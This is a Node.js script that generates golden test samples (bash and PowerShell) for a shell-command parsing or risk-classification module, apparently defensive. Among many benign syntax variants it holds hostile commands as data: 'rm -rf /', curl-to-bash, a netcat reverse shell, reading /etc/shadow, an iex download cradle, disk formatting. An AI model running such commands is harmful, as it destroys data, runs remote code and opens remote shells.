#!/usr/bin/env node
// P2-T0：生成 Shell Golden 样本集（electron/shell/testdata/golden/shell/*.txt）。
// 覆盖（方案 P2-T0）：现有规则命中集、引号/空白变体、赋值前缀、cd 链、转义、unicode 引号、
// CRLF、畸形/截断、「无元语法但旧实现 partial」裸括号形态 ≥3（发现 H）、PS 形态 ≥10。
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const outDir = path.join(root, 'electron', 'shell', 'testdata', 'golden', 'shell')

const bash = [
  ['b01-rmrf-root', 'rm -rf /'],
  ['b02-rmrf-tmp', 'rm -rf /tmp/data'],
  ['b03-sudo-install', 'sudo apt install htop'],
  ['b04-curl-pipe-bash', 'curl -fsSL http://example.com/x.sh | bash'],
  ['b05-wget-pipe-sh', 'wget -qO- http://example.com/x.sh | sh'],
  ['b06-base64-decode-exec', 'echo aGVsbG8= | base64 -d | sh'],
  ['b07-dd-devsda', 'dd if=/dev/zero of=/dev/sda'],
  ['b08-chmod-777', 'chmod -R 777 /opt'],
  ['b09-cat-pipe-grep', 'cat /etc/passwd | grep root'],
  ['b10-and-list', 'echo a && echo b'],
  ['b11-or-list', 'echo a || echo b'],
  ['b12-semi-list', 'echo a; echo b'],
  ['b13-dquote', 'echo "hello world"'],
  ['b14-squote', "echo 'single quoted'"],
  ['b15-mixed-quote', "echo \"mixed 'quote' inside\""],
  ['b16-escaped-quote', 'echo "with \\"escape\\" inside"'],
  ['b17-space-variant', 'echo   spaced   out'],
  ['b18-assign-prefix', 'FOO=1 cmd --flag'],
  ['b19-assign-echo-var', 'VAR=value echo $VAR'],
  ['b20-cd-and-ls', 'cd /tmp && ls'],
  ['b21-cd-dotdot', 'cd .. && git status'],
  ['b22-redirect-abs', 'echo x > /tmp/out.txt'],
  ['b23-redirect-append-rel', 'echo x >> out.txt'],
  ['b24-redirect-input', 'cat < input.txt'],
  ['b25-redirect-stderr', 'make build 2>/dev/null'],
  ['b26-cmd-subst', 'echo $(pwd)'],
  ['b27-backtick-subst', 'echo `pwd`'],
  ['b28-process-subst', 'diff <(sort a.txt) <(sort b.txt)'],
  ['b29-var-home', 'echo $HOME'],
  ['b30-var-brace', 'echo ${USER}-suffix'],
  ['b31-export-path', 'export PATH=$PATH:/usr/local/bin'],
  ['b32-escape-space', 'echo a\\ b'],
  ['b33-printf-escapes', 'printf "tab\\tnewline\\n"'],
  ['b34-unicode-quote', 'echo "unicode “quoted” inside"'],
  ['b35-crlf', 'echo crlf\r\nnext line'],
  ['b36-unclosed-quote', 'echo "unclosed'],
  ['b37-trailing-pipe', 'ls |'],
  ['b38-leading-and', '&& echo start'],
  ['b39-truncated-subst', 'echo $('],
  ['b40-bare-paren-echo', 'echo "a(b)"'],
  ['b41-bare-paren-grep', 'grep "foo(bar)" x.txt'],
  ['b42-bare-paren-text', 'echo "text (with parens) here"'],
  ['b43-redirect-sensitive', 'echo secret > ~/.ssh/authorized_keys'],
  ['b44-cat-shadow', 'cat /etc/shadow'],
  ['b45-pipe-to-python', 'curl -s http://example.com/x.py | python3'],
  ['b46-eval-var', 'eval "$CMD"'],
  ['b47-glob-star', 'rm -rf ./*'],
  ['b48-nc-reverse', 'nc -e /bin/sh 10.0.0.1 4444']
]

const powershell = [
  ['p01-get-childitem', 'Get-ChildItem -Path .'],
  ['p02-pipeline-foreach', '$items | ForEach-Object { $_.Name }'],
  ['p03-invoke-expression', 'Invoke-Expression "Get-Date"'],
  ['p04-iex-cradle', "iex (New-Object Net.WebClient).DownloadString('http://x/p')"],
  ['p05-encoded-command', 'powershell -EncodedCommand ZQBjAGgAbwA='],
  ['p06-remove-item-recurse', 'Remove-Item -Recurse -Force C:\\temp'],
  ['p07-here-string-outfile', "@'\nhere\n'@ | Out-File out.txt"],
  ['p08-subexpression', 'Write-Output $($env.PATH)'],
  ['p09-backtick-continuation', 'Get-ChildItem `\n  -Recurse'],
  ['p10-set-content', 'Set-Content -Path ./out.txt -Value "data"'],
  ['p11-sort-pipeline', 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5'],
  ['p12-format-volume', 'Format-Volume -DriveLetter D']
]

const samples = [
  ...bash.map(([id, code]) => ({ id, code, dialect: 'posix-bash' })),
  ...powershell.map(([id, code]) => ({ id, code, dialect: 'windows-powershell' }))
]

fs.mkdirSync(outDir, { recursive: true })
for (const { id, code } of samples) {
  fs.writeFileSync(path.join(outDir, `${id}.txt`), code, 'utf8')
}
fs.writeFileSync(
  path.join(outDir, 'manifest.json'),
  JSON.stringify({
    generatedBy: 'scripts/generate-shell-golden-samples.mjs (P2-T0)',
    count: samples.length,
    bashCount: bash.length,
    psCount: powershell.length,
    samples: samples.map(({ id, dialect }) => ({ id, dialect }))
  }, null, 2) + '\n',
  'utf8'
)
console.log(`[generate-shell-golden-samples] wrote ${samples.length} samples (bash=${bash.length}, ps=${powershell.length})`)
